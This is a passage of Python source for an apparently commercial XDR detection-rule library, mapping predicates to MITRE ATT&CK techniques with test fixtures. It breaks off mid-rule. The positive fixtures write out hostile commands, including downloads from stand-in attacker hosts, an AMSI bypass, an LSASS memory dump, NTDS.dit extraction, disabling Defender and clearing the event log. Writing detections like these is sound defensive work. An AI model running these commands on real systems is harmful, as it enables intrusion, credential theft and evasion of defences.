"""
NivXRay XDR — Enterprise Detection Content Library.
Authoritative implementations of high-fidelity detections across all 12 MITRE ATT&CK tactics.
Every rule is deterministic, explainable, and includes positive + negative verification fixtures.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List

from .models import (
    DetectionFixture,
    DetectionRuleContent,
    Platform,
    Severity,
    Tactic,
)


def _get_str(ev: Dict[str, Any], *keys: str) -> str:
    """Safely extract nested or flat string value."""
    for key in keys:
        if "." in key:
            parts = key.split(".")
            curr = ev
            for p in parts:
                if isinstance(curr, dict) and p in curr:
                    curr = curr[p]
                else:
                    curr = None
                    break
            if curr is not None:
                return str(curr)
        elif key in ev and ev[key] is not None:
            return str(ev[key])
    return ""


# ════════════════════════════════════════════════════════════════════════════
# 1. INITIAL ACCESS & EXECUTION
# ════════════════════════════════════════════════════════════════════════════

def _pred_encoded_powershell(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if "powershell" in proc or "pwsh" in proc or "powershell" in cmd:
        return any(flag in cmd for flag in ("-enc ", "-encodedcommand", "-e ", " -enc"))
    return False


def _pred_certutil_download(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("certutil.exe") or "certutil" in cmd:
        return "urlcache" in cmd and ("-split" in cmd or "-f" in cmd or "http" in cmd)
    return False


def _pred_bitsadmin_download(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("bitsadmin.exe") or "bitsadmin" in cmd:
        return "/transfer" in cmd and ("http" in cmd or "ftp" in cmd)
    return False


def _pred_office_spawning_script(ev: Dict[str, Any]) -> bool:
    parent = _get_str(ev, "parent_image", "process.parent_name", "ParentImage").lower()
    child = _get_str(ev, "image", "process.name", "Image").lower()
    office_apps = ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
    script_hosts = ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe", "pwsh.exe")
    return any(parent.endswith(app) for app in office_apps) and any(child.endswith(host) for host in script_hosts)


def _pred_wmi_process_creation(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("wmic.exe") or "wmic" in cmd:
        return "process" in cmd and "call" in cmd and "create" in cmd
    return False


def _pred_regsvr32_remote_sct(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("regsvr32.exe") or "regsvr32" in cmd:
        return "/i:" in cmd and "scrobj.dll" in cmd and ("http://" in cmd or "https://" in cmd)
    return False


def _pred_linux_pipe_to_bash(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    if ("curl" in cmd or "wget" in cmd) and ("|" in cmd):
        return any(target in cmd for target in ("| bash", "| sh", "| python", "| perl"))
    return False


# ════════════════════════════════════════════════════════════════════════════
# 2. PERSISTENCE & PRIVILEGE ESCALATION
# ════════════════════════════════════════════════════════════════════════════

def _pred_registry_run_key(ev: Dict[str, Any]) -> bool:
    path = _get_str(ev, "registry.path", "file.path", "TargetObject", "command_line").lower()
    if "currentversion\\run" in path or "currentversion\\runonce" in path:
        return any(act in _get_str(ev, "action", "event_kind").lower() for act in ("create", "set", "write", "modify", "reg.exe")) or "reg add" in path
    return False


def _pred_scheduled_task_creation(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("schtasks.exe") or "schtasks" in cmd:
        return "/create" in cmd and ("/ru" in cmd or "/sc" in cmd or "/tr" in cmd)
    return False


def _pred_service_installation(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("sc.exe") or "sc.exe" in cmd:
        return "create" in cmd and "binpath=" in cmd
    return False


def _pred_m365_inbox_rule(ev: Dict[str, Any]) -> bool:
    action = _get_str(ev, "cloud.action", "event_kind", "action").lower()
    rule_name = _get_str(ev, "cloud.rule_name", "command_line", "parameters").lower()
    if "new-inboxrule" in action or "set-inboxrule" in action or "inbox_rule" in action:
        return any(f in rule_name for f in ("forwardto", "redirectto", "deletemessage", "blindcarboncopy"))
    return False


def _pred_adcs_esc1_abuse(ev: Dict[str, Any]) -> bool:
    service = _get_str(ev, "service", "identity.service", "event_kind").lower()
    template = _get_str(ev, "template", "certificate.template", "parameters").lower()
    san = _get_str(ev, "san", "certificate.san", "details").lower()
    if "cert_request" in service or "ad_cs" in service or "certutil" in service:
        # Enrollee supplies Subject Alternative Name for high privilege
        return bool(san) and any(kw in template for kw in ("esc1", "enrollee_supplies_subject", "smartcard", "clientauth"))
    return False


def _pred_cloud_role_escalation(ev: Dict[str, Any]) -> bool:
    action = _get_str(ev, "cloud.action", "event_kind", "action")
    policy = _get_str(ev, "cloud.policy", "parameters", "details").lower()
    if action in ("PutUserPolicy", "AttachUserPolicy", "PutRolePolicy", "AttachRolePolicy"):
        return '"*"' in policy or "administratoraccess" in policy or "iam:*" in policy
    return False


# ════════════════════════════════════════════════════════════════════════════
# 3. DEFENSE EVASION
# ════════════════════════════════════════════════════════════════════════════

def _pred_defender_disabled(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    if "set-mppreference" in cmd:
        return "-disablerealtimemonitoring $true" in cmd or "-disablebehaviormonitoring $true" in cmd or "-disableioavprotection $true" in cmd
    return False


def _pred_wevtutil_log_clearing(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if proc.endswith("wevtutil.exe") or "wevtutil" in cmd:
        return " cl " in cmd or "clear-log" in cmd
    return False


def _pred_amsi_tampering(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    script = _get_str(ev, "script_text", "script.content", "details").lower()
    combined = f"{cmd} {script}"
    return "amsiutils" in combined and ("amsiinitfailed" in combined or "patch" in combined)


# ════════════════════════════════════════════════════════════════════════════
# 4. CREDENTIAL ACCESS
# ════════════════════════════════════════════════════════════════════════════

def _pred_lsass_dumping(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    target = _get_str(ev, "target_process", "process.target", "TargetImage").lower()
    if "lsass" in cmd or target.endswith("lsass.exe"):
        return any(ind in cmd for ind in ("comsvcs.dll", "minidump", "procdump", "dumpps", "rundll32", "0x00040", "processdump"))
    return False


def _pred_ntds_dit_vss_extraction(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    if "ntds.dit" in cmd:
        return any(ind in cmd for ind in ("ntdsutil", "vssadmin", "volume\\", "ac i ntds", "create full"))
    return False


def _pred_kerberoasting_spn(ev: Dict[str, Any]) -> bool:
    event_id = _get_str(ev, "security.event_id", "event_id")
    ticket_opt = _get_str(ev, "ticket_options", "parameters.ticket_options", "details").lower()
    service_name = _get_str(ev, "service_name", "identity.service_name", "TargetUserName").lower()
    if event_id == "4769":
        # RC4 request (0x17) against non-machine SPN
        return ("0x17" in ticket_opt or "ticket_encryption_type: 0x17" in ticket_opt) and not service_name.endswith("$")
    return False


def _pred_asrep_roasting(ev: Dict[str, Any]) -> bool:
    event_id = _get_str(ev, "security.event_id", "event_id")
    preauth = _get_str(ev, "preauth_type", "parameters.preauth_type", "details")
    if event_id == "4768":
        return preauth in ("0", "none", "no_preauth")
    return False


def _pred_cloud_imds_theft(ev: Dict[str, Any]) -> bool:
    dst_ip = _get_str(ev, "dst_ip", "network.destination_ip", "DestinationIp")
    url = _get_str(ev, "url", "network.url", "http.url").lower()
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    if dst_ip == "169.254.169.254" or "169.254.169.254" in url or "169.254.169.254" in cmd:
        return "security-credentials" in url or "token" in url or "metadata" in url or "iam/security-credentials" in cmd
    return False


# ════════════════════════════════════════════════════════════════════════════
# 5. DISCOVERY & LATERAL MOVEMENT
# ════════════════════════════════════════════════════════════════════════════

def _pred_ad_recon_tool(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if any(tool in proc for tool in ("sharphound", "adfind", "bloodhound")):
        return True
    if "adfind" in cmd:
        return any(flag in cmd for flag in ("-f ", "objectcategory=", "objectclass="))
    return False


def _pred_psexec_lateral_movement(ev: Dict[str, Any]) -> bool:
    service = _get_str(ev, "service_name", "registry.service_name", "TargetObject").lower()
    image = _get_str(ev, "image", "process.name", "Image").lower()
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    return "psexesvc" in service or "psexesvc.exe" in image or "psexec" in cmd


def _pred_winrm_remote_exec(ev: Dict[str, Any]) -> bool:
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    parent = _get_str(ev, "parent_image", "process.parent_name", "ParentImage").lower()
    return parent.endswith("wsmprovhost.exe") and proc.endswith("powershell.exe")


# ════════════════════════════════════════════════════════════════════════════
# 6. COMMAND AND CONTROL (RMM & TUNNELING)
# ════════════════════════════════════════════════════════════════════════════

def _pred_unauthorized_rmm_execution(ev: Dict[str, Any]) -> bool:
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    rmm_signatures = ("anydesk.exe", "screenconnect", "teamviewer.exe", "rustdesk.exe", "ateraagent", "splashtop")
    return any(rmm in proc or rmm in cmd for rmm in rmm_signatures)


def _pred_dns_tunneling(ev: Dict[str, Any]) -> bool:
    domain = _get_str(ev, "query", "network.dns_query", "dns.query").lower()
    # High label length and entropy pattern typical of DNS tunnels
    if len(domain) > 50 and domain.count(".") >= 3:
        subdomain = domain.split(".")[0]
        return len(subdomain) > 30 and re.match(r"^[a-zA-Z0-9_\-]+$", subdomain) is not None
    return False


# ════════════════════════════════════════════════════════════════════════════
# 7. IMPACT & RANSOMWARE
# ════════════════════════════════════════════════════════════════════════════

def _pred_vss_shadow_deletion(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if "vssadmin" in proc or "vssadmin" in cmd:
        return "delete" in cmd and "shadows" in cmd
    if "wmic" in proc or "wmic" in cmd:
        return "shadowcopy" in cmd and "delete" in cmd
    return False


def _pred_esxi_mass_vm_destruction(ev: Dict[str, Any]) -> bool:
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    if "vim-cmd" in cmd or "esxcli" in cmd:
        return ("vmsvc/power.off" in cmd or "vmsvc/destroy" in cmd) and ("vmsvc/getallvms" in cmd or "all" in cmd or "grep" in cmd)
    return False


def _pred_high_velocity_mass_encryption(ev: Dict[str, Any]) -> bool:
    ext = _get_str(ev, "file.extension", "target_extension", "details").lower()
    action = _get_str(ev, "file.action", "action", "event_kind").lower()
    rate = ev.get("modifications_per_second") or ev.get("fields", {}).get("rate") or 0
    ransom_exts = (".locked", ".crypted", ".crypto", ".enc", ".lockbit", ".blackcat", ".alphv")
    if any(ext.endswith(r) for r in ransom_exts):
        return True
    return rate > 50 and action in ("rename", "modify", "encrypt")


# ════════════════════════════════════════════════════════════════════════════
# 8. EMERGING IDENTITIES (NON-HUMAN & AI-AGENT)
# ════════════════════════════════════════════════════════════════════════════

def _pred_non_human_spn_abuse(ev: Dict[str, Any]) -> bool:
    principal_kind = _get_str(ev, "principal_kind", "identity.kind").lower()
    action = _get_str(ev, "cloud.action", "action").lower()
    if principal_kind in ("service_principal", "workload_identity", "managed_identity"):
        # Service principal altering credentials or adding credentials to other apps
        return any(a in action for a in ("addkey", "addpassword", "updatecredentials", "createaccesskey"))
    return False


def _pred_ai_agent_unauthorized_shell(ev: Dict[str, Any]) -> bool:
    principal = _get_str(ev, "user_id", "identity.principal_id", "user").lower()
    cmd = _get_str(ev, "command_line", "process.command_line", "CommandLine").lower()
    proc = _get_str(ev, "image", "process.name", "Image").lower()
    if any(agent_id in principal for agent_id in ("ai-agent", "copilot-service", "llm-executor", "autonomous-worker")):
        # Autonomous AI service spawning interactive subshell
        return proc.endswith("cmd.exe") or proc.endswith("powershell.exe") or proc.endswith("bash") or "sh -i" in cmd
    return False


# ════════════════════════════════════════════════════════════════════════════
# AUTHORITATIVE CATALOGUE DEFINITION
# ════════════════════════════════════════════════════════════════════════════

ENTERPRISE_DETECTION_RULES: List[DetectionRuleContent] = [
    # Initial Access & Execution
    DetectionRuleContent(
        rule_id="DET-EX-001",
        name="Suspicious Encoded PowerShell Execution",
        description="Detects PowerShell command lines using base64 encoded command arguments (-enc, -encodedcommand) frequently abused for obfuscation.",
        tactic=Tactic.EXECUTION,
        technique_id="T1059.001",
        technique_name="PowerShell",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="high",
        lane="content",
        predicate=_pred_encoded_powershell,
        telemetry_requirements=["process_creation", "command_line"],
        false_positive_notes="Legitimate admin software deployment scripts may use -EncodedCommand; verify parent process.",
        mitre_attack=["T1059.001", "T1027"],
        fixtures=[
            DetectionFixture("positive", {"Image": "powershell.exe", "CommandLine": "powershell.exe -enc SQBFAFgA..."}, True),
            DetectionFixture("negative", {"Image": "powershell.exe", "CommandLine": "powershell.exe Get-Process"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-EX-002",
        name="Certutil Ingress Tool Transfer (Download)",
        description="Detects abuse of certutil.exe using -urlcache to download remote payloads from external URLs.",
        tactic=Tactic.EXECUTION,
        technique_id="T1105",
        technique_name="Ingress Tool Transfer",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_certutil_download,
        telemetry_requirements=["process_creation", "command_line"],
        false_positive_notes="Rare administrative certificate download; verify destination URL.",
        mitre_attack=["T1105", "T1218"],
        fixtures=[
            DetectionFixture("positive", {"Image": "certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://attacker.com/mal.exe"}, True),
            DetectionFixture("negative", {"Image": "certutil.exe", "CommandLine": "certutil.exe -dump mycert.cer"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-EX-003",
        name="Bitsadmin Remote File Transfer",
        description="Detects bitsadmin.exe being used with /transfer to download external files.",
        tactic=Tactic.EXECUTION,
        technique_id="T1105",
        technique_name="Ingress Tool Transfer",
        platform=Platform.WINDOWS,
        severity=Severity.MEDIUM,
        confidence="high",
        lane="endpoint",
        predicate=_pred_bitsadmin_download,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1105", "T1218"],
        fixtures=[
            DetectionFixture("positive", {"Image": "bitsadmin.exe", "CommandLine": "bitsadmin /transfer job http://bad.com/payload.exe C:\\p.exe"}, True),
            DetectionFixture("negative", {"Image": "bitsadmin.exe", "CommandLine": "bitsadmin /list"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-IA-002",
        name="Office Application Spawning Script Host",
        description="Detects Microsoft Office products (Word, Excel, PowerPoint, Outlook) spawning script interpreters (PowerShell, CMD, WScript).",
        tactic=Tactic.INITIAL_ACCESS,
        technique_id="T1566.001",
        technique_name="Spearphishing Attachment",
        platform=Platform.WINDOWS,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="behavior",
        predicate=_pred_office_spawning_script,
        telemetry_requirements=["process_creation", "parent_process"],
        mitre_attack=["T1566.001", "T1204.002", "T1059.001"],
        fixtures=[
            DetectionFixture("positive", {"ParentImage": "WINWORD.EXE", "Image": "powershell.exe"}, True),
            DetectionFixture("negative", {"ParentImage": "explorer.exe", "Image": "powershell.exe"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-EX-004",
        name="WMI Local/Remote Process Creation",
        description="Detects process creation initiated through the Windows Management Instrumentation Command-line (WMIC).",
        tactic=Tactic.EXECUTION,
        technique_id="T1047",
        technique_name="Windows Management Instrumentation",
        platform=Platform.WINDOWS,
        severity=Severity.MEDIUM,
        confidence="high",
        lane="endpoint",
        predicate=_pred_wmi_process_creation,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1047"],
        fixtures=[
            DetectionFixture("positive", {"Image": "wmic.exe", "CommandLine": "wmic process call create calc.exe"}, True),
            DetectionFixture("negative", {"Image": "wmic.exe", "CommandLine": "wmic bios get serialnumber"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-EX-005",
        name="Regsvr32 Remote Scriptlet Execution (Squiblydoo)",
        description="Detects regsvr32.exe loading remote scrobj.dll scriptlets directly from external URLs.",
        tactic=Tactic.EXECUTION,
        technique_id="T1218.010",
        technique_name="Regsvr32",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_regsvr32_remote_sct,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1218.010"],
        fixtures=[
            DetectionFixture("positive", {"Image": "regsvr32.exe", "CommandLine": "regsvr32 /s /n /u /i:http://bad.com/a.sct scrobj.dll"}, True),
            DetectionFixture("negative", {"Image": "regsvr32.exe", "CommandLine": "regsvr32 mycomponent.dll"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-EX-006",
        name="Linux Pipe to Shell Execution",
        description="Detects Linux command lines that pipe curl or wget output directly into a shell interpreter.",
        tactic=Tactic.EXECUTION,
        technique_id="T1059.004",
        technique_name="Unix Shell",
        platform=Platform.LINUX,
        severity=Severity.HIGH,
        confidence="high",
        lane="content",
        predicate=_pred_linux_pipe_to_bash,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1059.004", "T1105"],
        fixtures=[
            DetectionFixture("positive", {"CommandLine": "curl -s http://bad.com/setup.sh | bash"}, True),
            DetectionFixture("negative", {"CommandLine": "curl -O http://example.com/archive.tar.gz"}, False),
        ],
    ),

    # Persistence & Privilege Escalation
    DetectionRuleContent(
        rule_id="DET-PS-001",
        name="Registry Run Key Persistence",
        description="Detects creation or modification of Windows Registry Run or RunOnce keys used for reboot persistence.",
        tactic=Tactic.PERSISTENCE,
        technique_id="T1547.001",
        technique_name="Registry Run Keys / Startup Folder",
        platform=Platform.WINDOWS,
        severity=Severity.MEDIUM,
        confidence="high",
        lane="endpoint",
        predicate=_pred_registry_run_key,
        telemetry_requirements=["registry_event", "command_line"],
        mitre_attack=["T1547.001"],
        fixtures=[
            DetectionFixture("positive", {"TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "action": "set"}, True),
            DetectionFixture("negative", {"TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\EventLog", "action": "set"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-PS-002",
        name="Suspicious Scheduled Task Creation",
        description="Detects creation of scheduled tasks via schtasks.exe.",
        tactic=Tactic.PERSISTENCE,
        technique_id="T1053.005",
        technique_name="Scheduled Task",
        platform=Platform.WINDOWS,
        severity=Severity.MEDIUM,
        confidence="medium",
        lane="endpoint",
        predicate=_pred_scheduled_task_creation,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1053.005"],
        fixtures=[
            DetectionFixture("positive", {"Image": "schtasks.exe", "CommandLine": "schtasks /create /sc daily /tn Backdoor /tr cmd.exe"}, True),
            DetectionFixture("negative", {"Image": "schtasks.exe", "CommandLine": "schtasks /query"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-PS-003",
        name="Windows Service Creation via SC.exe",
        description="Detects installation of new Windows services via sc.exe create.",
        tactic=Tactic.PERSISTENCE,
        technique_id="T1543.003",
        technique_name="Windows Service",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="high",
        lane="endpoint",
        predicate=_pred_service_installation,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1543.003"],
        fixtures=[
            DetectionFixture("positive", {"Image": "sc.exe", "CommandLine": "sc create Malware binpath= C:\\temp\\bad.exe start= auto"}, True),
            DetectionFixture("negative", {"Image": "sc.exe", "CommandLine": "sc query spooler"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-PS-004",
        name="M365 Malicious Inbox Rule Creation",
        description="Detects Exchange / M365 inbox rules configured to automatically forward or redirect messages externally.",
        tactic=Tactic.PERSISTENCE,
        technique_id="T1114.003",
        technique_name="Email Forwarding Rule",
        platform=Platform.CLOUD,
        severity=Severity.HIGH,
        confidence="high",
        lane="event",
        predicate=_pred_m365_inbox_rule,
        telemetry_requirements=["cloud_audit", "m365_exchange"],
        mitre_attack=["T1114.003"],
        fixtures=[
            DetectionFixture("positive", {"cloud": {"action": "New-InboxRule", "rule_name": "ForwardTo attacker@ext.com"}}, True),
            DetectionFixture("negative", {"cloud": {"action": "New-InboxRule", "rule_name": "MoveToFolder Archive"}}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-PE-002",
        name="Active Directory Certificate Services Template Misconfiguration Abuse",
        description="Detects certificate enrollment requests targeting vulnerable AD CS templates where enrollee supplies subject (ESC1).",
        tactic=Tactic.PRIVILEGE_ESCALATION,
        technique_id="T1649",
        technique_name="Steal or Forge Authentication Certificates",
        platform=Platform.IDENTITY,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="event",
        predicate=_pred_adcs_esc1_abuse,
        telemetry_requirements=["active_directory_audit", "ad_cs"],
        mitre_attack=["T1649", "T1078"],
        fixtures=[
            DetectionFixture("positive", {"service": "ad_cs_cert_request", "template": "ESC1-Template", "san": "dadmin@domain.local"}, True),
            DetectionFixture("negative", {"service": "ad_cs_cert_request", "template": "User", "san": ""}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-PE-003",
        name="Cloud IAM Excessive Policy Assignment",
        description="Detects AWS/Azure IAM policy assignments granting full wildcard administrator access.",
        tactic=Tactic.PRIVILEGE_ESCALATION,
        technique_id="T1098",
        technique_name="Account Manipulation",
        platform=Platform.CLOUD,
        severity=Severity.CRITICAL,
        confidence="high",
        lane="event",
        predicate=_pred_cloud_role_escalation,
        telemetry_requirements=["cloud_audit", "iam"],
        mitre_attack=["T1098", "T1078.004"],
        fixtures=[
            DetectionFixture("positive", {"cloud": {"action": "PutUserPolicy", "policy": "{\"Effect\":\"Allow\",\"Action\":\"*\"}"}}, True),
            DetectionFixture("negative", {"cloud": {"action": "PutUserPolicy", "policy": "{\"Effect\":\"Allow\",\"Action\":\"s3:GetObject\"}"}}, False),
        ],
    ),

    # Defense Evasion
    DetectionRuleContent(
        rule_id="DET-DE-001",
        name="Windows Defender Real-Time Monitoring Disabled",
        description="Detects PowerShell Set-MpPreference disabling Microsoft Defender real-time or behavior monitoring.",
        tactic=Tactic.DEFENSE_EVASION,
        technique_id="T1562.001",
        technique_name="Disable or Modify Tools",
        platform=Platform.WINDOWS,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="content",
        predicate=_pred_defender_disabled,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1562.001"],
        fixtures=[
            DetectionFixture("positive", {"CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}, True),
            DetectionFixture("negative", {"CommandLine": "powershell.exe Get-MpPreference"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-DE-002",
        name="Security Event Log Cleared via Wevtutil",
        description="Detects clearing of Windows Event Logs using wevtutil.exe cl.",
        tactic=Tactic.DEFENSE_EVASION,
        technique_id="T1070.001",
        technique_name="Clear Windows Event Logs",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_wevtutil_log_clearing,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1070.001"],
        fixtures=[
            DetectionFixture("positive", {"Image": "wevtutil.exe", "CommandLine": "wevtutil cl Security"}, True),
            DetectionFixture("negative", {"Image": "wevtutil.exe", "CommandLine": "wevtutil qe Security"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-DE-003",
        name="AMSI Memory Patch / Bypass",
        description="Detects in-memory patching of AmsiUtils.amsiInitFailed in PowerShell scripts.",
        tactic=Tactic.DEFENSE_EVASION,
        technique_id="T1562.001",
        technique_name="Disable or Modify Tools",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="confirmed",
        lane="content",
        predicate=_pred_amsi_tampering,
        telemetry_requirements=["script_block_logging", "command_line"],
        mitre_attack=["T1562.001"],
        fixtures=[
            DetectionFixture("positive", {"script_text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"}, True),
            DetectionFixture("negative", {"script_text": "Write-Output 'Normal maintenance script'"}, False),
        ],
    ),

    # Credential Access
    DetectionRuleContent(
        rule_id="DET-CR-001",
        name="LSASS Memory Dumping via Comsvcs/Procdump",
        description="Detects LSASS process memory dump via comsvcs.dll MiniDump or procdump.",
        tactic=Tactic.CREDENTIAL_ACCESS,
        technique_id="T1003.001",
        technique_name="LSASS Memory",
        platform=Platform.WINDOWS,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_lsass_dumping,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1003.001"],
        fixtures=[
            DetectionFixture("positive", {"CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 580 C:\\temp\\lsass.dmp full"}, True),
            DetectionFixture("negative", {"CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-CR-002",
        name="NTDS.dit Volume Shadow Copy Extraction",
        description="Detects extraction of ntds.dit active directory database using vssadmin or ntdsutil.",
        tactic=Tactic.CREDENTIAL_ACCESS,
        technique_id="T1003.003",
        technique_name="NTDS",
        platform=Platform.WINDOWS,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="endpoint",
        predicate=_pred_ntds_dit_vss_extraction,
        telemetry_requirements=["process_creation", "command_line"],
        mitre_attack=["T1003.003"],
        fixtures=[
            DetectionFixture("positive", {"CommandLine": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q"}, True),
            DetectionFixture("negative", {"CommandLine": "dir C:\\Windows\\NTDS"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-CR-004",
        name="Kerberoasting Service Principal Name Ticket Request",
        description="Detects Kerberos TGS ticket requests with weak RC4 encryption (0x17) targeting non-machine SPNs.",
        tactic=Tactic.CREDENTIAL_ACCESS,
        technique_id="T1558.003",
        technique_name="Kerberoasting",
        platform=Platform.IDENTITY,
        severity=Severity.HIGH,
        confidence="high",
        lane="event",
        predicate=_pred_kerberoasting_spn,
        telemetry_requirements=["security_event_4769", "kerberos"],
        mitre_attack=["T1558.003"],
        fixtures=[
            DetectionFixture("positive", {"security": {"event_id": "4769"}, "ticket_options": "0x17", "service_name": "MSSQLSvc/sql.corp"}, True),
            DetectionFixture("negative", {"security": {"event_id": "4769"}, "ticket_options": "0x12", "service_name": "DC01$"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-CR-005",
        name="AS-REP Roasting for Accounts Without Preauthentication",
        description="Detects Kerberos AS-REQ requests for accounts where Kerberos Pre-Authentication is disabled (Event 4768).",
        tactic=Tactic.CREDENTIAL_ACCESS,
        technique_id="T1558.004",
        technique_name="AS-REP Roasting",
        platform=Platform.IDENTITY,
        severity=Severity.HIGH,
        confidence="high",
        lane="event",
        predicate=_pred_asrep_roasting,
        telemetry_requirements=["security_event_4768", "kerberos"],
        mitre_attack=["T1558.004"],
        fixtures=[
            DetectionFixture("positive", {"security": {"event_id": "4768"}, "preauth_type": "0"}, True),
            DetectionFixture("negative", {"security": {"event_id": "4768"}, "preauth_type": "2"}, False),
        ],
    ),
    DetectionRuleContent(
        rule_id="DET-CR-006",
        name="Cloud Instance Metadata Service (IMDS) Credential Theft",
        description="Detects HTTP access or shell curl commands targeting 169.254.169.254 to steal IAM credentials.",
        tactic=Tactic.CREDENTIAL_ACCESS,
        technique_id="T1552.005",
        technique_name="Cloud Instance Metadata API",
        platform=Platform.CLOUD,
        severity=Severity.CRITICAL,
        confidence="confirmed",
        lane="network",
        predicate=_pred_cloud_imds_theft,
        telemetry_requirements=["network_traffic", "command_line"],
        mitre_attack=["T1552.005", "T1078.004"],
        fixtures=[
            DetectionFixture("positive", {"dst_ip": "169.254.169.254", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}, True),
            DetectionFixture("negative", {"dst_ip": "10.0.0.1", "url": "http://internal-portal.corp/"}, False),
        ],
    ),

    # Discovery & Lateral Movement
    DetectionRuleContent(
        rule_id="DET-DS-001",
        name="Active Directory Reconnaissance via SharpHound/AdFind",
        description="Detects execution of active directory discovery utilities used for domain mapping and attack path analysis.",
        tactic=Tactic.DISCOVERY,
        technique_id="T1087.002",
        technique_name="Domain Account",
        platform=Platform.WINDOWS,
        severity=Severity.HIGH,
        confidence="high",
        lane="endpoint",
        predicate=_pred_ad_recon_tool,
        telemetry_requirements=["process_creation", "command_line"],
